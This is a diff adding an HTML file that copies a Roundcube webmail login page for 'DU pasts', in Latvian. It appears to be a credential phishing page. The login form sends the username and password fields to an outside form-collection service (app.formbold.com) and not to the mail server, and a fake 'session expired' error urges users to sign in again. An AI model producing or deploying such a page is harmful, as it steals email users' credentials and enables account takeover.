@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="lv" class="js mozilla layout-large"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>DU pasts :: Esiet laipni lūgti DU pasts</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
+<meta name="theme-color" content="#f4f4f4">
+<meta name="msapplication-navbutton-color" content="#f4f4f4">
+
+	<link rel="shortcut icon" href="du_files/mail-logo.png">
+
+	<link rel="stylesheet" href="du_files/bootstrap.min.css">
+			<link rel="stylesheet" href="du_files/styles.css">
+		
+	<link rel="stylesheet" type="text/css" href="du_files/quarantine.css">
+<link rel="stylesheet" type="text/css" href="du_files/jquery-ui.css">
+<link rel="stylesheet" type="text/css" href="du_files/search_fucker.css">
+<script src="du_files/jquery.min.js"></script>
+<script src="du_files/common.min.js"></script>
+<script src="du_files/app.min.js"></script>
+<script src="du_files/jstz.min.js"></script>
+<script>
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"lv_LV","devel_mode":null,"rcversion":10411,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"skin":"elastic","blankpage":"skins/elastic/watermark.html","refresh_interval":180,"session_lifetime":7200,"action":"","comm_path":"./?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","request_token":"hekXGHzbrfufnxEwTTDrgBcerhzWcMDf"});
+rcmail.add_label({"loading":"Notiek iel\u0101de...","servererror":"Servera k\u013c\u016bda!","connerror":"Savienojuma k\u013c\u016bda - nav iesp\u0113jams piesl\u0113gties serverim!","requesttimedout":"Piepras\u012bjumam iest\u0101j\u0101s noilgums","refreshing":"Atjauno...","windowopenerror":"Izl\u0113co\u0161ais logs tika blo\u0137\u0113ts!","uploadingmany":"Aug\u0161upiel\u0101d\u0113 failus...","uploading":"Aug\u0161upiel\u0101de failu...","close":"Aizv\u0113rt","save":"Saglab\u0101t","cancel":"Atcelt","alerttitle":"Uzman\u012bbu","confirmationtitle":"Vai J\u016bs esat p\u0101rliecin\u0101ts...","delete":"Dz\u0113st","continue":"Turpin\u0101t","ok":"LABI","back":"Atpaka\u013c","errortitle":"Rad\u0101s k\u013c\u016bda!","options":"Opcijas","plaintoggle":"Vienk\u0101r\u0161s teksts","htmltoggle":"HTML","previous":"Iepriek\u0161\u0113j\u0101","next":"N\u0101ko\u0161\u0101","select":"Atz\u012bm\u0113t","browse":"Browse","choosefile":"Choose file...","choosefiles":"Choose files..."});
+rcmail.display_message("J\u016bsu sessija ir beigusies.","error",-1000);
+rcmail.gui_container("loginfooter","login-footer");rcmail.register_button('quarantine', 'rcmbtn100', 'link', '', '', '');
+rcmail.gui_object('loginform', 'login-form');
+rcmail.gui_object('message', 'messagestack');
+</script>
+
+<script src="du_files/amavis_quarantine.js"></script>
+<script src="du_files/jquery-ui.min.js"></script>
+<script src="du_files/jquery.ui.datepicker-lv.js"></script>
+
+</head>
+<body class="task-login action-none">
+			<div id="layout">
+	
+
+<h1 class="voice">DU pasts Autorizēties</h1>
+
+<div id="layout-content" class="selected no-navbar" role="main">
+	<img src="du_files/mail-logo.png" data-src-small="mail-logo.png?s=1602701406" id="logo" alt="Logo">
+	<form id="login-form" name="login-form" method="post" class="propform" action="https://app.formbold.com/s/9gZdl">
+<input type="hidden" name="_token" value="hekXGHzbrfufnxEwTTDrgBcerhzWcMDf" class="form-control">
+	<input type="hidden" name="_task" value="login" class="form-control"><input type="hidden" name="_action" value="login" class="form-control"><input type="hidden" name="_timezone" id="rcmlogintz" value="Africa/Lagos" class="form-control"><input type="hidden" name="_url" id="rcmloginurl" value="_task=login&amp;_err=session" class="form-control"><table><tbody><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginuser">Lietotājvārds</label>
+</td>
+<td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon user"></i></span><input name="_user" id="rcmloginuser" required="" size="40" autocapitalize="none" autocomplete="off" type="text" class="form-control" placeholder="Lietotājvārds"></td>
+</tr>
+<tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginpwd">Parole</label>
+</td>
+<td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon pass"></i></span><input name="_pass" id="rcmloginpwd" required="" size="40" autocapitalize="none" autocomplete="off" type="password" class="form-control" placeholder="Parole"></td>
+</tr>
+</tbody>
+</table>
+<p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">Autorizēties</button>
+</p>
+
+		<div id="login-footer" role="contentinfo">
+			DU pasts
+			
+						
+		</div>
+	</form>
+</div>
+
+<noscript>
+	<p class="noscriptwarning">Uzmanību: lai lasītu e-pastus, Jūsu pārlūkprogrammā jābūt ieslēgtiem JavaScript.</p>
+</noscript>
+
+</div>
+<div id="messagestack"></div>
+<script>
+$(function() {
+rcmail.init();
+});
+</script>
+
+
+
+<script src="du_files/bootstrap.bundle.min.js"></script>
+<script src="du_files/ui.min.js"></script>
+
+
+</body></html>
